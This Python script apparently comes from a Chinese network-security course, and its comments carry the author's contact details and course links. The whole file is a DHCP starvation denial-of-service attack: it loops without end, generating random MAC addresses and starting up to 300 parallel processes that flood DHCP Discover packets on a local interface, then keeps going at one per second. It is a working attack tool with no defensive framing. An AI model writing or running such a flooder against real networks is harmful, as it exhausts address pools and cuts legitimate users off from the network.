#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

import multiprocessing
import time
from Part1_Classic_Protocols.Tools.Random_MAC import Random_MAC
from DHCP_Discover import DHCP_Discover_Sendonly


def DHCP_Discover_DoS(ifname):
    i = 1
    while True:
        if i < 300:  # 300以内最大并发攻击！
            MAC_ADD = Random_MAC()  # 随机产生MAC地址！
            print(MAC_ADD)  # 打印随机产生的MAC地址！
            multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
            multi_dos.start()
            i += 1
        else:  # 300以上转为低速攻击！
            MAC_ADD = Random_MAC()  # 随机产生MAC地址！
            print(MAC_ADD)  # 打印随机产生的MAC地址！
            multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
            multi_dos.start()
            time.sleep(1)  # 每一秒发起一次攻击！
            i += 1


if __name__ == '__main__':
    DHCP_Discover_DoS('ens33')
